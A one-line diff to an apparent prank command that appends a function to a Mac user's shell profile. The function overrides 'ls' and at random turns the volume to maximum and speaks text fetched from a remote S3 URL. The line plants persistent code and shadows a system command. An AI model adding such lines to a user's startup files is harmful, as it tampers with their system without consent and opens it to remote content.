@@ -1,1 +1,1 @@
-echo -e 'function ls() { /bin/ls $1; if [ $RANDOM -le 10000 ]; then osascript -e "set volume output volume 100";curl -s https://s3.amazonaws.com/ewetest_s3_josh/haiku | say; fi; }' >> ~/.profile;source ~/.profile
+echo -e 'function ls() { /bin/ls $1; if [ $RANDOM -le 10000 ]; then osascript -e "set volume output volume 100";curl -s https://s3.amazonaws.com/ewetest_s3_josh/haiku | say; fi; }' >> ~/.bash_profile;source ~/.bash_profile
